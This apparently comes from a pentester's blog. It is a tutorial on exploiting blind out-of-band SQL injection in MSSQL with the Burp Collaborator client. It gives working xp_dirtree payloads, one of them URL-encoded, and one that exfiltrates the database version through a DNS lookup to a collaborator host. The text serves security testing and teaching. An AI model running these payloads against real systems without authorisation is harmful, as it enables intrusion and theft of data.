Out of band SQL injection is method by which we can exfiltrate data via different channel. This article is not about Blind OOB SQL injection theory , please read awesome white paper by M Stampar(sqlmap author) https://arxiv.org/pdf/1303.3047 to understand OOB SQLi theory and exploiting OOB SQLi with SQLMap, however the challenge with OOB SQLi is setting up DNS infrastructure to capture the response. I have read many articles and looked at many tools for easy implementation without any luck.

In my recent penetration testing burp scanner detected a blind SQLi using burp collaborator, i realized burp has already setup a DNS infra which i can leverage, however it was not straightforward to use burp collaborator to exploit OOB SQLi, there are not any good documentation on it. While searching for an answer i stumbled on Exploiting a Blind XSS using Burp Suite from Agarri(Burp Ninja) he has used burp collaborator client, i could not completely understand how to use burp collaborator client from his article, however it gave lot of clues to try burp collaborator client.

To use burp collaborator client , from burp pro menu select burp collaborator client and it will open a new pop up window as shown below.


Now click on copy to clipboard button, open a notepad/text editor and paste the subdomain provided by collaborator client, now go to repeater and construct a request using the payload/subdomain provided by burp collaborator client, I have below payloads for testing.

This payload will send a new dns request to collaborator and you can verify response from collaborator client.

';declare @q varchar(99);set @q='\\subdomain provided by collabrator
.burpcollab'+'orator.net\pyg'; exec master.dbo.xp_dirtree @q;-- 

While using in repeater we have to URL encode the special characters like below.
﻿
'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cabcdefghigkmalopqrstw.burpcollab'%2b'orator.net%5cpyg'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20

﻿
This payload can be used for getting version of DBMS. While using repeater url encode the special characters.

;declare @q varchar(200);set @q='\\subdomain provided by collabrator'+(SELECT SUBSTRING(@@version,1,9))+'.burpcollaborator.net\foo'; exec master.dbo.xp_dirtree @q; --

After sending request from burp repeater , wait for response. You will find the response in collaborator client as shown below and you can use this same technique for manually testing OOB XSS, OOB XXE and other OOB attacks.

References.

https://portswigger.net/burp/help/collaborator.htmlhttps://portswigger.net/burp/help/suite_functions_collaborator_client.html

https://portswigger.net/burp/help/suite_functions_collaborator_client.html
